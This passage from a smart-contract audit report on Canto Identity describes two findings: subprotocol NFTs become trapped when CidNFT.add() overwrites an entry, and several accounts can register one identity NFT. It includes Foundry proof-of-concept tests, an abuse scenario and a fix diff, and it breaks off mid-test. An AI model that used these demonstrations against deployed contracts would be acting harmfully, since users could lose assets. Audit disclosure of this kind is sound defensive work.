subNft2)</code> were added consecutively, <code>subNft1</code> would be trapped in the contract forever, because <code>subNft1</code> stored in <code>cidData</code> was overwritten by <code>subNft2</code>, and only <code>subNft2</code> can be retrieved through <code>CidNFT.remove()</code>.</p>\n<p>For <code>AssociationType.PRIMARY</code>:<br>\nIf <code>subNft1</code> and <code>subNft2</code> were added consecutively, <code>subNft1</code> would be trapped in the contract forever, because <code>subNft1</code> stored in <code>cidData</code> was overwritten by <code>subNft2</code>, and only <code>subNft2</code> can be retrieved through <code>CidNFT.remove()</code>.</p>\n<p>Test code for PoC:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/src/test/CidNFT.t.sol b/src/test/CidNFT.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 8a6a87a..45d91bd 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/src/test/CidNFT.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/src/test/CidNFT.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -67,6 +67,81 @@ contract CidNFTTest is DSTest, ERC721TokenReceiver {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+    function testTrappedByAddingOrdered() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        address user = user2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        vm.startPrank(user);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // mint two nft for user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        (uint256 nft1, uint256 nft2) = (101, 102);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        sub1.mint(user, nft1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        sub1.mint(user, nft2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        sub1.setApprovalForAll(address(cidNFT), true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // mint CidNFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        uint256 cid = cidNFT.numMinted() + 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.mint(new bytes[](0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        uint256 key = 111;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // add nft1 to CidNFT a key</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.add(cid, &quot;sub1&quot;, key, nft1, CidNFT.AssociationType.ORDERED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // add nft2 to CidNFT with the same key</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.add(cid, &quot;sub1&quot;, key, nft2, CidNFT.AssociationType.ORDERED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // confirm: both nft1 and nft2 have been transferred to CidNFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft1), address(cidNFT));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft2), address(cidNFT));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // the first remove will success</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.remove(cid, &quot;sub1&quot;, key, nft1, CidNFT.AssociationType.ORDERED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // nft2 has been transferred back to the user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft2), user);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // the second remove will fail for OrderedValueNotSet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        vm.expectRevert(abi.encodeWithSelector(CidNFT.OrderedValueNotSet.selector, cid, &quot;sub1&quot;, key));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.remove(cid, &quot;sub1&quot;, key, nft1, CidNFT.AssociationType.ORDERED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // nft1 is trapped in CidNFT forever</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft1), address(cidNFT));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+    function testTrappedByAddingPrimary() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        address user = user2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        vm.startPrank(user);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // mint two nft for user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        (uint256 nft1, uint256 nft2) = (101, 102);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        sub1.mint(user, nft1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        sub1.mint(user, nft2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        sub1.setApprovalForAll(address(cidNFT), true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // mint CidNFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        uint256 cid = cidNFT.numMinted() + 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.mint(new bytes[](0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // key is useless when adding PRIMARY type</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        uint256 key = 111;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // add nft1 to CidNFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.add(cid, &quot;sub1&quot;, key, nft1, CidNFT.AssociationType.PRIMARY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // add nft2 to CidNFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.add(cid, &quot;sub1&quot;, key, nft2, CidNFT.AssociationType.PRIMARY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // confirm: both nft1 and nft2 have been transferred to CidNFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft1), address(cidNFT));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft2), address(cidNFT));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // the first remove will success</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.remove(cid, &quot;sub1&quot;, key, nft1, CidNFT.AssociationType.PRIMARY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // nft2 has been transferred back to the user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft2), user);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // the second remove will fail for PrimaryValueNotSet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        vm.expectRevert(abi.encodeWithSelector(CidNFT.PrimaryValueNotSet.selector, cid, &quot;sub1&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        cidNFT.remove(cid, &quot;sub1&quot;, key, nft1, CidNFT.AssociationType.PRIMARY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        // nft1 is trapped in CidNFT forever</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(sub1.ownerOf(nft1), address(cidNFT));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     function testAddID0() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         // Should revert if trying to add NFT ID 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         vm.expectRevert(abi.encodeWithSelector(CidNFT.NotAuthorizedForCIDNFT.selector, address(this), 0, address(0)));</span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Should revert the tx if an overwriting is found in CidNFT.add():</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/src/CidNFT.sol b/src/CidNFT.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index b6c88de..c389971 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/src/CidNFT.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/src/CidNFT.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -101,6 +101,8 @@ contract CidNFT is ERC721, ERC721TokenReceiver {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     error AssociationTypeNotSupportedForSubprotocol(AssociationType associationType, string subprotocolName);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     error NotAuthorizedForCIDNFT(address caller, uint256 cidNFTID, address cidNFTOwner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     error NotAuthorizedForSubprotocolNFT(address caller, uint256 subprotocolNFTID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+    error OrderedKeyIsSetAlready(uint256 cidNFTID, string subprotocolName, uint256 key, uint256 nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+    error PrimaryIsSetAlready(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     error ActiveArrayAlreadyContainsID(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     error OrderedValueNotSet(uint256 cidNFTID, string subprotocolName, uint256 key);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     error PrimaryValueNotSet(uint256 cidNFTID, string subprotocolName);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -191,10 +193,16 @@ contract CidNFT is ERC721, ERC721TokenReceiver {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         if (_type == AssociationType.ORDERED) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+            if (cidData[_cidNFTID][_subprotocolName].ordered[_key] != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+                revert OrderedKeyIsSetAlready(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         } else if (_type == AssociationType.PRIMARY) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+            if (cidData[_cidNFTID][_subprotocolName].primary != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+                revert PrimaryIsSetAlready(_cidNFTID, _subprotocolName, _nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         } else if (_type == AssociationType.ACTIVE) {</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187#issuecomment-1499331349\">OpenCoreCH (Canto Identity) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-02-multiple-accounts-can-have-the-same-identity\" style=\"position:relative;\"><a href=\"#m-02-multiple-accounts-can-have-the-same-identity\" aria-label=\"m 02 multiple accounts can have the same identity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/177\">[M-02] Multiple accounts can have the same identity</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/177\">joestakey</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/169\">MiniGlome</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/164\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/140\">libratus</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/116\">shenwilly</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/110\">glcanvas</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/104\">wait</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/17\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/15\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/12\">hihen</a>, and <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/7\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L47\">AddressRegistry.sol#L47</a></p>\n<p>Users can register their on-chain identity (ie their CID NFT) by calling <code>AddressRegistry.register()</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AddressRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">register</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">) != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// We only guarantee that a CID NFT is owned by the user at the time of registration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// ownerOf reverts if non-existing ID is provided</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NFTNotOwnedByUser</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">cidNFTs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CIDNFTAdded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>This overwrites <code>cidNFTs[msg.sender]</code> with the <code>cidNFTID</code> provided by the caller.</p>\n<p>The issue is that there is nothing preventing several (2 or more) accounts to point to the same <code>cidNFTID</code>, ie have <code>cidNFTs[userA] == cidNFTs[userB]</code></p>\n<p>Note: the README mentioned that</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Transferring CID NFTs that are still referenced in the address registry: CID NFTs are transferrable on purpose and a user can transfer his CID NFT while it is still registered to his address if he wants to do so.</span></span></code></pre>\n<p>The issue described in this report is not that the CID NFT is transferrable, but that several accounts can point to the same CIDNFT id, which lead to several problems outlined below.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Quoting the README:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Canto Identity NFTs (CID NFTs) represent individual on-chain identities</span></span></code></pre>\n<p>Here, several accounts can point to the same on-chain identity, breaking the requirement that the said identity should be <strong>individual</strong>.</p>\n<p>To illustrate the consequences of this, let us look at <code>CidNFT.add()</code>, which adds a new entry for the given subprotocol to the provided CID NFT:</p>\n<ul>\n<li>data is added by transferring a subprotocol NFT to the contract, which will write the NFT id in <code>cidData[_cidNFTID][_subprotocolName]</code></li>\n<li>This NFT id represents traits that will be associated with the identity.</li>\n</ul>\n<p>Because of the issue outlined above, the identity system can be abused:</p>\n<ul>\n<li>Alice registers her CIDNft by calling <code>addressRegistry.register(N)</code></li>\n<li>she transfers it to Bob, who then proceeds to call <code>addressRegistry.register(N)</code> to register it.</li>\n<li>at this point, <code>cidNFT</code> of id <code>N</code> points to both Alice and Bob: <code>addressRegistry.getCID(Alice) == addressRegistry.getCID(Bob)</code></li>\n<li>Bob calls <code>CidNFT.add()</code> to add a subProtocol NFT X to his identity <code>N</code> . Because Alice is also associated to the <code>CIDNFT</code> <code>N</code>, she essentially added this trait for free (assuming subprotocols will monetize their tokens, Bob had to pay the cost of the subProtocol NFT X, but Alice did not).</li>\n<li>This can also have further consequences depending on what can be done with these traits (e.g: a protocol giving rewards for users with a trait of the subProtocol NFT X, Bob could be front run by Alice and not receive a reward he was entitled to)</li>\n</ul>\n<p>Overall, because this issue impacts a key aspect of the protocol (identities are not individual) and can lead to a form of <code>theft</code> in certain conditions (in the scenario above, Alice got a trait added to her identity for “free”), the Medium severity seems appropriate.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>This test shows how two users can point to the same <code>CID</code>.<br>\nAdd it to <code>AddressRegistry.t.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testTwoUsersSameCID</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftIdOne</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Alice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Bob</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1 - Alice mints NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addList</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addList</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftIdOne</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2 - Alice registers the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">addressRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">register</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftIdOne</span><span 